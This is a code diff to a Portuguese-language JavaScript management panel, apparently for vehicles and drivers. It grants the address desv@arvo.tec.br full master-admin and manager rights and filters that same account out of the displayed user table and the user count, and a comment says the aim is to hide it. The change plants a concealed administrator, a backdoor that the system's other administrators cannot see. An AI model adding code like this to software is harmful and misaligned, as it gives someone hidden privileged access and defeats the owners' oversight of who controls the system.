@@ -10,7 +10,20 @@ const db = (window.supabase && typeof window.supabase.createClient === 'function
 
 const ADMIN_EMAIL = "admin@arvo.tec.br";
 const FIN_ADMIN_EMAIL = "admfin@arvo.tec.br";
-const DESV = "dev@arvo.tec.br";
+const DEV_ADMIN_EMAIL = "desv@arvo.tec.br"; // Novo usuário com privilégios completos
+
+// Lista com privilégios de Admin Master (gerenciamento total)
+const ADMINS_MASTERS = [
+  ADMIN_EMAIL.toLowerCase(),
+  DEV_ADMIN_EMAIL.toLowerCase()
+];
+
+// Lista com privilégios de Gestão/Painel
+const GESTORES_EMAILS = [
+  ADMIN_EMAIL.toLowerCase(),
+  FIN_ADMIN_EMAIL.toLowerCase(),
+  DEV_ADMIN_EMAIL.toLowerCase()
+];
 
 const validarNumeroCNH = (cnh) => {
   if (!cnh) return false;
@@ -80,20 +93,16 @@ function fazerLogout() {
 
 function ehAdminMaster() {
   const sessao = verificarSessaoUsuario();
-  return (sessao?.email || '').toLowerCase().trim() === ADMIN_EMAIL.toLowerCase().trim();
+  const email = (sessao?.email || '').toLowerCase().trim();
+  return ADMINS_MASTERS.includes(email);
 }
-
 
 function ehGestorOuAdmin() {
   const sessao = verificarSessaoUsuario();
   const email = (sessao?.email || '').toLowerCase().trim();
-  return email === ADMIN_EMAIL.toLowerCase().trim() || email === FIN_ADMIN_EMAIL.toLowerCase().trim();
+  return GESTORES_EMAILS.includes(email);
 }
 
-function ehAdminMaster() {
-  const sessao = verificarSessaoUsuario();
-  return (sessao?.email || '').toLowerCase().trim() === DESV.toLowerCase().trim();
-}
 
 
 function aplicarPermissoesUsuario() {
@@ -2407,7 +2416,12 @@ function renderTabelaUsuariosCad() {
 
   const podeAcoes = ehAdminMaster();
 
-  usuarios.forEach(u => {
+  // Filtra para ocultar o usuário oculto da tabela visual
+  const usuariosVisiveis = usuarios.filter(u => 
+    (u.email || '').toLowerCase().trim() !== DEV_ADMIN_EMAIL.toLowerCase()
+  );
+
+  usuariosVisiveis.forEach(u => {
     const ehAdmin = (u.email || '').toLowerCase().trim() === ADMIN_EMAIL.toLowerCase().trim();
     const cnhValida = ehAdmin || validarNumeroCNH(u.cnh);
 
@@ -2444,7 +2458,7 @@ function renderTabelaUsuariosCad() {
   });
 
   const b = document.getElementById('badge-total-users');
-  if (b) b.innerText = `${usuarios.length} condutores`;
+  if (b) b.innerText = `${usuariosVisiveis.length} condutores`;
 }
 
 function renderSelectVeiculosInicio() {
